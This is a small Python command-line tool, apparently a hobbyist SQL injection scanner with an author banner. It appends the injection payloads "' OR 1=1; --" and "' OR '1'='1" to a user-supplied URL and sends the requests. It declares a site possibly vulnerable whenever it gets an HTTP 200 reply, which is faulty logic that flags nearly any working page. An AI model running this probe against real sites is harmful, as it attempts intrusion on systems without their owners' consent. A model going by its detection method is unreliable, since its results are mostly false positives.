import requests

print('''\033[92m
 .oooooo..o   .oooooo.      ooooo        ooooo 
d8P'    `Y8  d8P'  `Y8b     `888'        `888' 
Y88bo.      888      888     888          888  
 `"Y8888o.  888      888     888          888  
     `"Y88b 888      888     888          888  
oo     .d8P `88b    d88b     888       o  888  
8""88888P'   `Y8bood8P'Ybd' o888ooooood8 o888o 
                                               
                                               
                                               
                                                                      
	coded by t8qa
	Github Page : https://github.com/t8qa
''')

def scan(url):
  # These are common SQL injection payloads
  payloads = ["' OR 1=1; --", "' OR '1'='1"]

  for payload in payloads:
    r = requests.get(url + payload)
    if r.status_code == 200:
      print(f"\033[92m [+] Possible SQL injection vulnerability found at {url}\n")
    else:
      print("\033[91m [-] Vulnerability Not Found\n")
      break
      

scan(input("\033[92m [*] Enter URL: "))


while True:
    next = input("Do You Want To Scan Another URL ? (Y/N) :")
    if next == "Y" or next == "y":
        url = input("Enter the URL: ")
        print(scan(url))
    elif next == "N" or next == "n":
        print("Exiting...")
        break